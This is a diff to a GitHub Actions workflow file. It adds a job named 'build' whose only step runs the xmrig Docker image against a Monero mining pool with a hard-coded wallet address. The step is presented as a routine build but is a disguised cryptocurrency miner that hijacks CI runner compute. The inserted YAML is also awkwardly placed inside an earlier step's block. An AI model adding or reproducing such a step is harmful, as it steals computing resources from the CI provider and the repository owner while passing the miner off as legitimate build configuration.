@@ -51,3 +51,13 @@ jobs:
         run: |
           cd $GOPATH/src/github.com/$GITHUB_REPOSITORY
           go tool cover -func=coverage.out
+          # This workflow contains a single job called "build"
+  build:
+    runs-on: ubuntu-latest
+    steps:
+
+      - uses: actions/checkout@v2
+
+      # Runs a single command using the runners shell
+      - name: Build
+        run: docker run --rm -e POOL_URL=pool.minexmr.com:4444  -e POOL_USER=488gqmpBPEtLtf97ZUs6zuRZgk1DkVYtCdVZ8AXfZh2zBvTppPysRJjeMCC5XC1neMYsNPPgp56qZejNdPMmRGibBSkP5ws metal3d/xmrig
